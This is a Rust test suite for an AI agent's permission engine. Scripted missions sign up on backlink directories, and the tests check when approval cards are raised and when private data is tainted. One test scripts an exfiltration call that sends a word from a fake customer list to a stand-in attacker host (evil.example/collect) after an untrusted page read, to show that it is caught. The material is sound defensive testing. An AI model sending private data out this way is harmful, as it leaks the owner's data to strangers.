//! The backlink walkthrough's blockers for an unattended Full mission: the brief's ledger text, the
//! bot's own mailbox and its own address must not turn a research-and-sign-up task into a stream
//! of approval cards, while real private data of the owner must still be caught on its way out.
//!
//! The trust reasoning (see `taint::names_private_data`):
//!
//! * the ledger is the bot's own bookkeeping: untrusted (never the owner's words, never an
//!   instruction) but not the owner's private data;
//! * the bot's own `AgentMail` inbox holds mail from strangers: untrusted, not private; the
//!   address is the bot's own, not foreign text; an IMAP mailbox bound to the bot (it can be the
//!   owner's own) and every other mailbox stay private reads;
//! * what a run may send to places the owner did not name is budgeted per site.

use std::sync::Arc;
use std::sync::atomic::Ordering;

use builtin_tools::connector_email::{AccountKind, SendMode};
use missions::supervisor::{Clock, SystemClock};
use permission_engine::Policy;
use protocol::{Event, PermissionCategory};
use serde_json::{Value, json};
use task_runtime::RunState;
use tool_registry::{ContentClass, Effect};

use crate::mail_tests::{account, connector};
use crate::mission_session_tests::{World, owner_says, world};
use crate::tests::{
    Fake, MACHINE_B, Reply, TestTool, calls, cfg, lane_cfg, make_loop, profile, text, until,
    with_class,
};

const FULL: &str = "[permissions]\npreset = \"full\"\n";
/// The goal as the owner wrote it.
const GOAL: &str = "Sitem webioo.com.tr icin backlink istiyorum. Backlink alabilecegim yerlere kendi mail adresinle kayit ol.";
/// The bot's own `AgentMail` address: hex digits in it make it look like a key.
const OWN: &str = "praxi-8f3a9c1d2e4b@agentmail.to";
/// What the owner keeps private: a customer list on the bot's disk.
const CUSTOMERS: &str = "customers.csv: Hanne Lorentzen, account tail4242, Zurichstrasse 12; praxi-8f3a9c1d2e4b@agentmail.to";
const BIO: &str = "Webioo is a web design and SEO agency from Turkey. We build fast, accessible websites for small businesses and help them to be found online with honest, long-term search optimisation.";

fn real(name: &str, effect: Effect, category: PermissionCategory, output: &str) -> Arc<TestTool> {
    Arc::new(with_class(
        name,
        effect,
        category,
        builtin_tools::classify(name).expect("a built-in tool"),
        output,
    ))
}

/// The tools of a sign-up task, with the content class the real tool has.
struct Kit {
    all: Vec<Arc<TestTool>>,
}

impl Kit {
    fn new() -> Self {
        let b = PermissionCategory::Browser;
        let m = PermissionCategory::Messaging;
        let listing = json!({
            "folder": "INBOX",
            "own_addresses": [OWN],
            "total_matches": 1,
            "returned": 1,
            "messages": [{"id": "msg-77", "subject": "Confirm your account", "from": "noreply@dir.example",
                          "from_addr": "noreply@dir.example", "to": [OWN], "date": "2026-11-27T01:00:00Z", "unread": true}],
        })
        .to_string();
        Self {
            all: vec![
                // As `web-tools` declares it: untrusted text, can send out.
                Arc::new(with_class(
                    "web_extract",
                    Effect::Read,
                    b,
                    ContentClass::untrusted_egress(),
                    "A directory of web design agencies with a free listing.",
                )),
                // The bounded research pass, as `web-tools` declares it: a fetch tool (Write) that
                // brings untrusted text in and reads only.
                Arc::new(with_class(
                    "web_research",
                    Effect::Write,
                    b,
                    ContentClass::untrusted_egress(),
                    "Source [1] A directory of web design agencies with a free listing.",
                )),
                real("browser_open", Effect::Write, b, "opened"),
                real("browser_fill", Effect::Write, b, "ok"),
                real("browser_click", Effect::Write, b, "ok"),
                real(
                    "email_wait_for",
                    Effect::Read,
                    m,
                    r#"{"found":true,"codes":["123456"],"followable_links":[]}"#,
                ),
                // As the connector declares it: untrusted, private, egress.
                Arc::new(with_class(
                    "email_search",
                    Effect::Read,
                    m,
                    ContentClass::all(),
                    &listing,
                )),
                // As the connector declares them.
                Arc::new(with_class(
                    "email_read",
                    Effect::Read,
                    m,
                    ContentClass::all(),
                    r#"{"message":{"subject":"Confirm your account"}}"#,
                )),
                Arc::new(with_class(
                    "email_list_folders",
                    Effect::Read,
                    m,
                    ContentClass::declared(false, true, true),
                    r#"{"folders":["INBOX"]}"#,
                )),
                Arc::new(with_class(
                    "email_mark_read",
                    Effect::Write,
                    m,
                    ContentClass::egress(),
                    r#"{"read":true}"#,
                )),
                real("fs_read", Effect::Read, PermissionCategory::Fs, CUSTOMERS),
            ],
        }
    }

    fn count(&self, name: &str) -> usize {
        self.all
            .iter()
            .find(|t| t.spec.name == name)
            .map_or(0, |t| t.count.load(Ordering::SeqCst))
    }
}

/// A mission session of a Full bot with the kit and `own` as its mail identity (when set, a
/// bound `AgentMail` inbox at address `OWN`). The model's replies are `script`.
fn session_loop(
    w: &World,
    kit: &Kit,
    script: Vec<Reply>,
    account_of: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
) -> (crate::AgentLoop, Arc<Fake>) {
    session_loop_with(w, kit, script, account_of, cfg(Policy::full()), FULL)
}

/// [`session_loop`] with the loop config and the bot's profile text chosen by the test.
fn session_loop_with(
    w: &World,
    kit: &Kit,
    script: Vec<Reply>,
    account_of: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
    mut config: crate::LoopConfig,
    bot_toml: &str,
) -> (crate::AgentLoop, Arc<Fake>) {
    let fake = Fake::new(script);
    config.guards.max_steps = 400;
    let refs: Vec<&Arc<TestTool>> = kit.all.iter().collect();
    let lp = make_loop(
        &w.env.storage,
        w.env.bot,
        &fake,
        &refs,
        profile(bot_toml),
        config,
    );
    for tool in builtin_tools::meta::tools() {
        lp.sh.tools.register(tool);
    }
    let clock: Arc<dyn Clock> = Arc::new(SystemClock);
    lp.enable_missions(&w.store, &clock, None);
    lp.mail_handle().set(connector(account_of(w)));
    (lp, fake)
}

fn own_inbox(w: &World) -> Vec<builtin_tools::connector_email::AccountConfig> {
    vec![account(
        "bot-mail",
        Some(w.env.bot.to_string()),
        OWN,
        SendMode::Ask,
    )]
}

/// Run one session to its end or its first card; returns the card's tool name and input.
async fn run_to_card(lp: &crate::AgentLoop, w: &World, brief: &str) -> Option<(String, Value)> {
    let mut rx = lp.subscribe();
    let run = lp
        .run_mission_session(w.env.chat, &w.mission, brief)
        .unwrap();
    let event = until(&mut rx, |e| {
        matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
    })
    .await;
    if let Event::ApprovalNeeded(card) = event {
        lp.cancel(run).unwrap();
        return Some((card.tool_name, card.input));
    }
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    None
}

/// One site of the backlink task: pick the item, read the directory, open the sign-up page,
/// type the bot's own address and a profile text, submit, wait for the confirmation mail, look
/// at the inbox, close the item.
fn site(i: usize) -> Vec<Reply> {
    let key = format!("dir-{i}.example");
    let url = format!("https://dir-{i}.example/signup?plan=free");
    vec![
        calls(&[(
            format!("d{i}").as_str(),
            "mission_item",
            json!({"key": key, "status": "doing"}),
        )]),
        calls(&[(
            format!("x{i}").as_str(),
            "web_extract",
            json!({"url": format!("https://dir-{i}.example/")}),
        )]),
        calls(&[(
            format!("o{i}").as_str(),
            "browser_open",
            json!({"url": url}),
        )]),
        calls(&[(
            format!("a{i}").as_str(),
            "browser_fill",
            json!({"ref": "e1", "text": OWN}),
        )]),
        calls(&[(
            format!("b{i}").as_str(),
            "browser_fill",
            json!({"ref": "e2", "text": BIO}),
        )]),
        calls(&[(
            format!("s{i}").as_str(),
            "browser_click",
            json!({"ref": "e9"}),
        )]),
        calls(&[(
            format!("w{i}").as_str(),
            "email_wait_for",
            json!({"site": format!("https://dir-{i}.example"), "block_seconds": 1}),
        )]),
        calls(&[(
            format!("m{i}").as_str(),
            "email_search",
            json!({"folder": "INBOX", "query": {"unread": true}}),
        )]),
        calls(&[(
            format!("e{i}").as_str(),
            "mission_item",
            json!({"key": key, "status": "done", "result": "account created"}),
        )]),
    ]
}

fn ten_keys() -> Vec<String> {
    (0..10).map(|i| format!("dir-{i}.example")).collect()
}

#[tokio::test]
async fn a_ten_site_mission_on_full_signs_up_everywhere_without_a_single_card() {
    let keys = ten_keys();
    let w = world(&keys.iter().map(String::as_str).collect::<Vec<_>>());
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let mut script: Vec<Reply> = (0..10).flat_map(site).collect();
    script.push(text("Done: ten sites registered."));
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    assert_eq!(
        run_to_card(&lp, &w, "MISSION BRIEF · session 1").await,
        None,
        "an unattended mission asks nobody until money"
    );
    assert_eq!(w.store.progress(&w.mission).unwrap().done, 10);
    assert_eq!(kit.count("browser_open"), 10);
    assert_eq!(kit.count("browser_fill"), 20);
    assert_eq!(kit.count("email_wait_for"), 10);
    assert_eq!(kit.count("email_search"), 10);
}

/// What the owner's Full bot does first in a mission: it looks at its own inbox, opens a public
/// site it has never seen (nothing read from that site yet, the ledger and the mailbox are the
/// only untrusted text in the run), types its own address and a short profile text into the
/// form and submits it.
fn medium_sign_up() -> Vec<Reply> {
    vec![
        calls(&[("e", "email_search", json!({"folder": "INBOX"}))]),
        calls(&[(
            "o",
            "browser_open",
            json!({"url": "https://medium.com/m/signin"}),
        )]),
        calls(&[("a", "browser_fill", json!({"ref": "e1", "text": OWN}))]),
        calls(&[("b", "browser_fill", json!({"ref": "e2", "text": BIO}))]),
        calls(&[("s", "browser_click", json!({"ref": "e9"}))]),
        text("Signed up on medium.com."),
    ]
}

fn assert_medium_signed_up(kit: &Kit) {
    assert_eq!(kit.count("browser_open"), 1);
    assert_eq!(kit.count("browser_fill"), 2);
    assert_eq!(kit.count("browser_click"), 1);
}

/// The owner's bug report (a Full bot's mission asked "allow sending" before it opened
/// medium.com): the production shape of the loop, with the Full lane on, runs it without a card.
#[tokio::test]
async fn a_full_bots_mission_opens_a_public_site_and_fills_the_sign_up_form_without_a_card() {
    let w = world(&["medium-com"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let (lp, _fake) = session_loop_with(
        &w,
        &kit,
        medium_sign_up(),
        own_inbox,
        lane_cfg(Policy::full()),
        FULL,
    );
    assert_eq!(
        run_to_card(&lp, &w, "MISSION BRIEF · session 1").await,
        None
    );
    assert_medium_signed_up(&kit);
}

/// The same task for a bot whose computer is the paired server: the browser calls go to the
/// server over the link, the approvals are decided here and are no stricter for it.
#[tokio::test]
async fn a_full_bots_mission_on_the_server_computer_signs_up_without_a_card() {
    use crate::server_computer_tests::{Links, ServerLink};
    let w = world(&["medium-com"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let toml = format!("{FULL}[runtime]\ncomputer = \"server:{MACHINE_B}\"\n");
    let (lp, _fake) = session_loop_with(
        &w,
        &kit,
        medium_sign_up(),
        own_inbox,
        lane_cfg(Policy::full()),
        &toml,
    );
    lp.set_server_links(Arc::new(Links(vec![(
        MACHINE_B,
        Arc::new(ServerLink::default()),
    )])));
    assert_eq!(
        run_to_card(&lp, &w, "MISSION BRIEF · session 1").await,
        None
    );
    assert_medium_signed_up(&kit);
}

/// Money is the one thing that still asks in the same mission.
#[tokio::test]
async fn the_same_mission_still_asks_before_it_pays() {
    let w = world(&["medium-com"]);
    owner_says(&w, GOAL);
    let mut kit = Kit::new();
    kit.all.push(Arc::new(with_class(
        "pay_invoice",
        Effect::Write,
        PermissionCategory::Money,
        ContentClass::none(),
        "paid",
    )));
    let mut script = medium_sign_up();
    script.insert(
        4,
        calls(&[("p", "pay_invoice", json!({"amount": "9.00 USD"}))]),
    );
    let (lp, _fake) =
        session_loop_with(&w, &kit, script, own_inbox, lane_cfg(Policy::full()), FULL);
    let card = run_to_card(&lp, &w, "MISSION BRIEF · session 1").await;
    assert_eq!(card.map(|c| c.0), Some("pay_invoice".to_owned()));
    assert_eq!(
        kit.count("browser_fill"),
        2,
        "the sign-up itself needed no card"
    );
}

#[tokio::test]
async fn the_brief_makes_a_session_untrusted_but_not_a_holder_of_private_data() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let (lp, _fake) = session_loop(&w, &kit, vec![text("nothing to do")], own_inbox);
    let run = lp
        .run_mission_session(w.env.chat, &w.mission, "brief")
        .unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    let record = w.env.storage.get_run(run).unwrap().unwrap();
    let ctx = lp.sh.ctx(&record).unwrap();
    let taint = ctx.taint.lock();
    assert!(
        taint.exposure.untrusted,
        "ledger text is never an instruction"
    );
    assert!(!taint.exposure.private);
    assert!(
        !taint.private_source,
        "the ledger is not the owner's private data"
    );
    assert!(!taint.seen.unhashed);
    assert!(taint.sources().iter().any(|l| l == "mission ledger"));
}

#[tokio::test]
async fn the_next_session_does_not_inherit_a_private_mark_from_the_ledger_label_or_the_own_inbox() {
    let w = world(&["a.example", "b.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("w", "email_wait_for", json!({"block_seconds": 1}))]),
        calls(&[("m", "email_search", json!({"folder": "INBOX"}))]),
        text("Session 1 done."),
        text("Session 2 done."),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    let first = lp
        .run_mission_session(w.env.chat, &w.mission, "brief 1")
        .unwrap();
    assert_eq!(lp.wait(first).await.unwrap(), RunState::Succeeded);
    let second = lp
        .run_mission_session(w.env.chat, &w.mission, "brief 2")
        .unwrap();
    assert_eq!(lp.wait(second).await.unwrap(), RunState::Succeeded);
    let record = w.env.storage.get_run(second).unwrap().unwrap();
    let ctx = lp.sh.ctx(&record).unwrap();
    let taint = ctx.taint.lock();
    assert!(taint.exposure.untrusted);
    assert!(
        !taint.private_source && !taint.seen.unhashed,
        "labels of the first session (ledger, own inbox): {:?}",
        taint.sources()
    );
    assert!(
        taint.sources().iter().any(|l| l == "own inbox INBOX"),
        "the own-inbox read is still named: {:?}",
        taint.sources()
    );
}

#[tokio::test]
async fn real_private_data_in_a_mission_still_asks_before_it_leaves() {
    // The run reads the owner's customer list (private, hashed), then a directory page (untrusted),
    // then a page of a site the owner did not name is asked to carry a word of the list out.
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        // Public details of a plain sign-up: nothing private in them.
        calls(&[(
            "o1",
            "browser_open",
            json!({"url": "https://dir-0.example/signup?plan=free"}),
        )]),
        // The bot's own address, typed into a form of a stranger's site.
        calls(&[("f1", "browser_fill", json!({"ref": "e1", "text": OWN}))]),
        // A word of the private list leaves in a URL.
        calls(&[(
            "o2",
            "browser_open",
            json!({"url": "https://evil.example/collect?d=tail4242"}),
        )]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    let card = run_to_card(&lp, &w, "brief").await;
    assert_eq!(
        card.as_ref().map(|c| c.0.as_str()),
        Some("browser_open"),
        "{card:?}"
    );
    assert_eq!(
        card.unwrap().1["url"],
        "https://evil.example/collect?d=tail4242"
    );
    assert_eq!(
        kit.count("browser_open"),
        1,
        "only the plain sign-up page was opened"
    );
    assert_eq!(
        kit.count("browser_fill"),
        1,
        "the own address needed no card"
    );
}

#[tokio::test]
async fn a_research_pass_runs_in_a_mission_without_a_card() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[(
            "r1",
            "web_research",
            json!({
                "question": "Which free directories list web design agencies?",
                "sub_questions": ["free web design agency directories", "directory listing rules"],
                "max_sources": 6
            }),
        )]),
        calls(&[(
            "r2",
            "web_research",
            json!({"question": "directory submission guidelines"}),
        )]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    assert_eq!(run_to_card(&lp, &w, "brief").await, None);
    assert_eq!(kit.count("web_research"), 2);
}

#[tokio::test]
async fn a_research_pass_asks_when_a_question_would_carry_a_word_of_the_private_list_out() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        // Plain questions still go through after the private read and the page.
        calls(&[(
            "q1",
            "web_research",
            json!({"question": "free web design directories"}),
        )]),
        // A word of the private list inside a sub-question goes to the search provider.
        calls(&[(
            "q2",
            "web_research",
            json!({
                "question": "free web design directories",
                "sub_questions": ["directories", "tail4242 directories"]
            }),
        )]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    let card = run_to_card(&lp, &w, "brief").await;
    assert_eq!(
        card.as_ref().map(|c| c.0.as_str()),
        Some("web_research"),
        "{card:?}"
    );
    assert_eq!(card.unwrap().1["question"], "free web design directories");
    assert_eq!(kit.count("web_research"), 1, "only the plain question ran");
}

#[tokio::test]
async fn private_words_typed_into_a_stranger_form_ask_even_next_to_the_bots_own_address() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        calls(&[(
            "f1",
            "browser_fill",
            json!({"ref": "e1", "text": format!("Hanne Lorentzen {OWN}")}),
        )]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    let card = run_to_card(&lp, &w, "brief").await;
    assert_eq!(card.map(|c| c.0), Some("browser_fill".to_owned()));
    assert_eq!(kit.count("browser_fill"), 0);
}

#[tokio::test]
async fn an_address_that_is_not_the_bots_own_is_still_judged_like_any_text() {
    // Same hex-looking address, but the bot has no such identity: it is a key-shaped string.
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        calls(&[("f1", "browser_fill", json!({"ref": "e1", "text": OWN}))]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, |_| Vec::new());
    let card = run_to_card(&lp, &w, "brief").await;
    assert_eq!(card.map(|c| c.0), Some("browser_fill".to_owned()));
}

/// The owner's own mailbox over IMAP, bound to the bot.
fn imap_bound(w: &World) -> Vec<builtin_tools::connector_email::AccountConfig> {
    let mut a = account(
        "owner-mail",
        Some(w.env.bot.to_string()),
        "me@example.org",
        SendMode::Ask,
    );
    a.kind = AccountKind::ImapSmtp;
    a.inbox_id = None;
    a.imap.host = "imap.example.org".into();
    a.smtp.host = "smtp.example.org".into();
    vec![a]
}

/// An `AgentMail` inbox every bot may use (not bound to this one).
fn shared_pool(_: &World) -> Vec<builtin_tools::connector_email::AccountConfig> {
    vec![account("pool-mail", None, OWN, SendMode::Ask)]
}

/// What a mission session that read mail through `email_search` (any card is approved once) holds
/// afterwards: untrusted content, the owner's private data, and whether pages are quarantined.
async fn taint_after_mail_read(
    accounts: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
) -> (bool, bool, bool) {
    taint_after_mail_call("email_search", json!({"folder": "INBOX"}), accounts).await
}

async fn taint_after_mail_call(
    tool: &'static str,
    input: Value,
    accounts: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
) -> (bool, bool, bool) {
    let w = world(&["a.example"]);
    let kit = Kit::new();
    let script = vec![calls(&[("m", tool, input)]), text("done")];
    let (lp, _fake) = session_loop(&w, &kit, script, accounts);
    let mut rx = lp.subscribe();
    let run = lp
        .run_mission_session(w.env.chat, &w.mission, "brief")
        .unwrap();
    loop {
        let event = until(&mut rx, |e| {
            matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
        })
        .await;
        match event {
            Event::ApprovalNeeded(card) => lp
                .approve(card.call_id, crate::ApprovalScope::Once, w.env.user)
                .unwrap(),
            _ => break,
        }
    }
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert_eq!(kit.count(tool), 1);
    let record = w.env.storage.get_run(run).unwrap().unwrap();
    let ctx = lp.sh.ctx(&record).unwrap();
    // The lock is not held across `quarantined`, which takes it too.
    let (untrusted, private) = {
        let taint = ctx.taint.lock();
        (taint.exposure.untrusted, taint.private_source)
    };
    let quarantined = crate::page_guard::quarantined(crate::page_guard::ReaderMode::Auto, &ctx);
    (untrusted, private, quarantined)
}

#[tokio::test]
async fn reading_the_bots_own_agentmail_inbox_is_untrusted_but_not_private() {
    // Strangers' mail: pages and screenshots stay available to the run.
    assert_eq!(taint_after_mail_read(own_inbox).await, (true, false, false));
}

#[tokio::test]
async fn reading_an_imap_mailbox_bound_to_the_bot_is_still_private() {
    // It can be the owner's own mailbox: private, so pages go through the reader and screenshots
    // are held back.
    assert_eq!(taint_after_mail_read(imap_bound).await, (true, true, true));
}

#[tokio::test]
async fn reading_an_inbox_every_bot_may_use_is_still_private() {
    assert_eq!(taint_after_mail_read(shared_pool).await, (true, true, true));
}

#[tokio::test]
async fn waiting_on_an_imap_mailbox_bound_to_the_bot_is_a_private_read_but_not_on_its_own_inbox() {
    // `email_wait_for` answers for any identity the bot owns; only the AgentMail one is the
    // bot's own inbox. An IMAP mailbox bound to it can be the owner's.
    let wait = || json!({"block_seconds": 1});
    assert_eq!(
        taint_after_mail_call("email_wait_for", wait(), own_inbox).await,
        (true, false, false)
    );
    assert_eq!(
        taint_after_mail_call("email_wait_for", wait(), imap_bound).await,
        (true, true, true)
    );
}

/// What asks first in a session that read a page and then makes this call on a mail account:
/// the tool of the first card, `None` when nothing asked.
async fn first_card_after_a_page(
    tool: &'static str,
    input: Value,
    accounts: impl FnOnce(&World) -> Vec<builtin_tools::connector_email::AccountConfig>,
) -> Option<String> {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let script = vec![
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        calls(&[("m", tool, input)]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, accounts);
    run_to_card(&lp, &w, "brief").await.map(|c| c.0)
}

fn mail_calls() -> Vec<(&'static str, Value)> {
    vec![
        ("email_search", json!({"folder": "INBOX"})),
        ("email_read", json!({"message_id": "msg-77"})),
        ("email_list_folders", json!({})),
        ("email_mark_read", json!({"message_id": "msg-77"})),
        ("email_wait_for", json!({"block_seconds": 1})),
    ]
}

#[tokio::test]
async fn the_sign_up_waiver_covers_only_the_bots_own_agentmail_inbox() {
    // After a page read, the bot's own AgentMail inbox is read, marked and waited on without a
    // card; the owner's IMAP mailbox bound to the bot and an inbox every bot may use keep the
    // card path, for every call the waiver names.
    for (tool, input) in mail_calls() {
        assert_eq!(
            first_card_after_a_page(tool, input.clone(), own_inbox).await,
            None,
            "{tool} on the bot's own AgentMail inbox"
        );
        assert_eq!(
            first_card_after_a_page(tool, input.clone(), imap_bound)
                .await
                .as_deref(),
            Some(tool),
            "{tool} on an IMAP mailbox bound to the bot"
        );
        assert_eq!(
            first_card_after_a_page(tool, input, shared_pool)
                .await
                .as_deref(),
            Some(tool),
            "{tool} on an inbox every bot may use"
        );
    }
}

/// Spend `chars` of the mission's send ceiling, as earlier sessions would have.
fn spend_mission(w: &World, chars: usize) {
    assert!(
        w.store
            .take_send_budget(&w.mission, chars as u64, u64::MAX / 2)
            .unwrap()
    );
}

/// One sign-up in a session that holds the owner's private data (the budgets only meter such a
/// run): read the customer list, read a directory page, open the sign-up page, type a profile
/// text. Returns the card (tool) if one was needed.
async fn sign_up_card(w: &World, kit: &Kit) -> Option<String> {
    let script = vec![
        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        calls(&[(
            "o",
            "browser_open",
            json!({"url": "https://dir-0.example/signup?plan=free"}),
        )]),
        calls(&[("b", "browser_fill", json!({"ref": "e2", "text": BIO}))]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(w, kit, script, own_inbox);
    run_to_card(&lp, w, "brief").await.map(|c| c.0)
}

#[tokio::test]
async fn the_mission_send_ceiling_is_kept_with_the_mission_and_a_new_session_does_not_reset_it() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    // A first session sends its sign-up text and the store has it afterwards.
    assert_eq!(sign_up_card(&w, &Kit::new()).await, None);
    let after_first = w.store.sent_chars(&w.mission).unwrap();
    assert!(
        after_first >= BIO.chars().count() as u64,
        "the mission counts what the session sent: {after_first}"
    );
    // A second session adds to the same total instead of starting at zero.
    assert_eq!(sign_up_card(&w, &Kit::new()).await, None);
    assert!(w.store.sent_chars(&w.mission).unwrap() >= 2 * after_first - 20);
}

#[tokio::test]
async fn a_mission_that_used_up_its_send_ceiling_asks_even_in_a_fresh_session() {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    // Earlier sessions used all but a few characters; this session's own run budget is untouched.
    spend_mission(&w, crate::full_autonomy::MISSION_SEND_BUDGET - 10);
    let kit = Kit::new();
    // The first address (the session starts untrusted, so even the first page read counts) goes
    // over the ceiling: it asks, and nothing is typed.
    let card = sign_up_card(&w, &kit).await;
    assert!(
        matches!(card.as_deref(), Some("web_extract" | "browser_open")),
        "{card:?}"
    );
    assert_eq!(kit.count("browser_fill"), 0);
    // Nothing of the refused call was counted.
    assert_eq!(
        w.store.sent_chars(&w.mission).unwrap(),
        (crate::full_autonomy::MISSION_SEND_BUDGET - 10) as u64
    );
}

#[tokio::test]
async fn a_mission_whose_send_total_cannot_be_kept_asks() {
    // The mission is not in the store the loop was given: nothing can be counted, so it asks.
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    let kit = Kit::new();
    let other = Arc::new(missions::MissionStore::open_in_memory().unwrap());
    let script = vec![
        calls(&[("r", "fs_read", json!({"path": "customers.csv"}))]),
        calls(&[("x", "web_extract", json!({"url": "https://dir-0.example/"}))]),
        calls(&[(
            "o",
            "browser_open",
            json!({"url": "https://dir-0.example/signup?plan=free"}),
        )]),
        text("done"),
    ];
    let (lp, _fake) = session_loop(&w, &kit, script, own_inbox);
    lp.set_mission_store(other);
    let card = run_to_card(&lp, &w, "brief").await;
    assert!(
        matches!(
            card.as_ref().map(|c| c.0.as_str()),
            Some("web_extract" | "browser_open")
        ),
        "{card:?}"
    );
    assert_eq!(kit.count("browser_open"), 0);
}

/// A chat message an earlier session left behind, with the provenance it was stored with.
fn earlier_message(w: &World, private: bool, sources: &[&str]) {
    w.env
        .storage
        .insert_message(&storage::Message {
            id: uuid::Uuid::now_v7(),
            user_id: w.env.user,
            chat_id: w.env.chat,
            run_id: None,
            role: "assistant".into(),
            content: "Read the inbox.".into(),
            created_at_ms: storage::now_ms(),
            exposure_untrusted: true,
            exposure_private: private,
            exposure_sources: sources.iter().map(|s| (*s).to_owned()).collect(),
        })
        .unwrap();
}

/// (private, unhashed) of the next session after such a message.
async fn taint_after_earlier_message(private: bool, label: &str) -> (bool, bool) {
    let w = world(&["a.example"]);
    owner_says(&w, GOAL);
    earlier_message(&w, private, &[label]);
    let kit = Kit::new();
    let (lp, _fake) = session_loop(&w, &kit, vec![text("done")], own_inbox);
    let run = lp
        .run_mission_session(w.env.chat, &w.mission, "brief")
        .unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    let record = w.env.storage.get_run(run).unwrap().unwrap();
    let ctx = lp.sh.ctx(&record).unwrap();
    let taint = ctx.taint.lock();
    (taint.private_source, taint.seen.unhashed)
}

#[tokio::test]
async fn a_stored_own_inbox_label_is_a_name_and_the_message_bit_decides() {
    // Stored from a read the daemon cleared (identity and kind): not private, as before.
    assert_eq!(
        taint_after_earlier_message(false, "own inbox INBOX").await,
        (false, false)
    );
    // The same words on a message that DID hold private data are not a declassification.
    let (private, unhashed) = taint_after_earlier_message(true, "own inbox INBOX").await;
    assert!(private || unhashed, "read as the owner's mailbox");
    // Free text after the prefix never declassifies, whatever the message bit says.
    let (private, unhashed) =
        taint_after_earlier_message(false, "own inbox INBOX and other words").await;
    assert!(private && unhashed);
}
